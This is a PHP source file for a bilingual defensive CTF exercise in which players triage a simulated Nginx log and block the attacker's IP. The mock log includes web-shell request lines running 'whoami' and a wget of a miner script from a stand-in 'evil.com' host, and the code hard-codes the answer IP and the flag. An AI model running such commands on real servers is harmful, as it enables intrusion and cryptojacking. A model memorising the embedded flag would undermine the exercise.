<?php
require_once __DIR__ . '/../bootstrap.php';

$pageTitle = $lang === 'es' ? 'Reto CTF #08: SOC Triage — CyberEscudo' : 'CTF Challenge #08: SOC Triage — CyberEscudo';
$pageDescription = $lang === 'es' ? 'Simulador de Triage y Contención de Incidentes.' : 'Incident Triage and Containment Simulator.';
$current_page = 'ctf/ctf-08.php';
require __DIR__ . '/../templates/header.php';

$feedback = "";
$flag = "";
$esExito = false;

// IP maliciosa que deben detectar en el log
$malicious_ip = "185.12.99.102";

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ip_to_block'])) {
    $ip_ingresada = trim($_POST['ip_to_block']);
    
    if ($ip_ingresada === $malicious_ip) {
        $esExito = true;
        $feedback = $lang === 'es' 
            ? "¡EXCELENTE! Has aislado la IP atacante (185.12.99.102) que estaba inyectando comandos a través de upload.php. Amenaza contenida." 
            : "EXCELLENT! You have isolated the attacking IP (185.12.99.102) that was injecting commands via upload.php. Threat contained.";
        $flag = "FLAG{ir_containment_expert}";
    } elseif (filter_var($ip_ingresada, FILTER_VALIDATE_IP)) {
        $feedback = $lang === 'es' 
            ? "[ERROR] La IP $ip_ingresada pertenece a un cliente legítimo. Acabas de causar una denegación de servicio a un usuario inocente." 
            : "[ERROR] IP $ip_ingresada belongs to a legitimate client. You just caused a denial of service to an innocent user.";
    } else {
        $feedback = $lang === 'es' ? "[ERROR] Formato de IP inválido." : "[ERROR] Invalid IP format.";
    }
}

// Log simulado
$mock_log = <<<LOG
10.0.0.52 - - [14/Aug/2026:10:15:01 +0200] "GET /index.php HTTP/1.1" 200 4512 "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
10.0.0.11 - - [14/Aug/2026:10:15:05 +0200] "GET /assets/style.css HTTP/1.1" 200 1024 "Mozilla/5.0 (Macintosh; Intel Mac OS X)"
10.0.0.52 - - [14/Aug/2026:10:15:08 +0200] "GET /contact.php HTTP/1.1" 200 3100 "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
10.0.0.88 - - [14/Aug/2026:10:16:10 +0200] "POST /login.php HTTP/1.1" 302 0 "Mozilla/5.0 (X11; Linux x86_64)"
185.12.99.102 - - [14/Aug/2026:10:16:22 +0200] "GET /uploads/image.php?cmd=whoami HTTP/1.1" 200 33 "curl/7.68.0"
185.12.99.102 - - [14/Aug/2026:10:16:25 +0200] "GET /uploads/image.php?cmd=wget+http://evil.com/miner.sh HTTP/1.1" 200 0 "curl/7.68.0"
10.0.0.52 - - [14/Aug/2026:10:16:30 +0200] "GET /about.php HTTP/1.1" 200 2800 "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
LOG;
?>

<main class="content-page">
    <div class="md-container m-bottom-2" style="max-width: 900px; margin: 0 auto; padding-top: 4rem;">
        <span class="section-label" style="color: #ff2a2a;">// <?= $lang === 'es' ? 'RETO CTF 08' : 'CTF CHALLENGE 08' ?></span>
        <h1 style="text-align: center; margin-bottom: 2rem;"><?= $lang === 'es' ? 'Centro de Operaciones de Seguridad (SOC)' : 'Security Operations Center (SOC)' ?></h1>
        
        <div style="background: rgba(10,15,20,0.8); padding: 2rem; border: 1px solid var(--cyan); border-radius: 8px; box-shadow: 0 0 20px rgba(0,255,255,0.1);">
            
            <div style="background: #111; padding: 1.5rem; border-left: 4px solid #ff2a2a; margin-bottom: 2rem;">
                <h3 style="color: #ff2a2a; margin-top: 0;">🚨 <?= $lang === 'es' ? 'ALERTA CRÍTICA: Actividad Anómala Detectada' : 'CRITICAL ALERT: Anomalous Activity Detected' ?></h3>
                <p style="color: var(--white); font-size: 0.95rem; line-height: 1.6; margin-bottom: 0;">
                    <?= $lang === 'es' ? 'El EDR del servidor web ha detectado un uso de CPU del 99%. Hemos extraído los últimos logs de acceso de Nginx (<em>access.log</em>). Tu objetivo es analizar el log, identificar la dirección IP del atacante que está ejecutando comandos remotos (RCE) y añadirla a la lista negra del Firewall perimetral.' : 'The web server EDR detected 99% CPU usage. We extracted the latest Nginx access logs (<em>access.log</em>). Your goal is to analyze the log, identify the attacker\'s IP address executing remote commands (RCE), and add it to the perimeter Firewall blacklist.' ?>
                </p>
            </div>

            <h4 style="color: var(--cyan); font-family: var(--mono); margin-bottom: 0.5rem;">[ /var/log/nginx/access.log ]</h4>
            <div style="background: #000; padding: 1rem; border: 1px solid #333; font-family: var(--mono); font-size: 0.85rem; color: #aaa; white-space: pre-wrap; overflow-x: auto; margin-bottom: 2rem; line-height: 1.5;">
<?= htmlspecialchars($mock_log) ?>
            </div>
            
            <form method="POST" action="">
                <label style="display:block; color: var(--cyan); font-family: var(--mono); margin-bottom: 0.5rem; font-weight: bold;">
                    <?= $lang === 'es' ? '🛡️ IP MALICIOSA A BLOQUEAR:' : '🛡️ MALICIOUS IP TO BLOCK:' ?>
                </label>
                <div style="display: flex; gap: 10px;">
                    <input type="text" name="ip_to_block" class="cyber-input" style="flex: 1;" placeholder="Ej: 10.0.0.1" autocomplete="off" value="<?= htmlspecialchars($_POST['ip_to_block'] ?? '') ?>" <?= $esExito ? 'disabled' : '' ?>>
                    
                    <button type="submit" style="background: <?= $esExito ? '#333' : '#ff2a2a' ?>; border: none; color: #fff; padding: 0 30px; font-family: var(--mono); font-weight: bold; cursor: <?= $esExito ? 'not-allowed' : 'pointer' ?>; font-size: 1rem; transition: opacity 0.3s;" <?= $esExito ? 'disabled' : '' ?>>
                        <?= $lang === 'es' ? 'APLICAR REGLA (DROP)' : 'APPLY RULE (DROP)' ?>
                    </button>
                </div>
            </form>

            <?php if($feedback !== ""): ?>
                <div style="margin-top: 2rem; padding: 1rem; background: <?= $esExito ? 'rgba(0,255,0,0.1)' : 'rgba(255,42,42,0.1)' ?>; border: 1px solid <?= $esExito ? '#00ff00' : '#ff2a2a' ?>; font-family: var(--mono); font-size: 0.9rem; color: <?= $esExito ? '#00ff00' : '#ff2a2a' ?>;">
                    <?= $feedback ?>
                </div>
            <?php endif; ?>

            <?php if($esExito): ?>
                <div style="margin-top: 1.5rem; text-align: center; animation: pulse 2s infinite;">
                    <h3 style="color: #00ff00; margin: 1rem 0; font-family: var(--mono); letter-spacing: 2px;"><?= $flag ?></h3>
                    <p style="margin:0; font-size: 0.85rem; color: var(--cyan);">
                        <?= $lang === 'es' ? 'Ve a la terminal principal y canjea tu medalla:' : 'Go to the main terminal and redeem your medal:' ?> <strong>submit <?= $flag ?></strong>
                    </p>
                </div>
            <?php endif; ?>

        </div>
    </div>
</main>

<?php require __DIR__ . '/../templates/footer.php'; ?>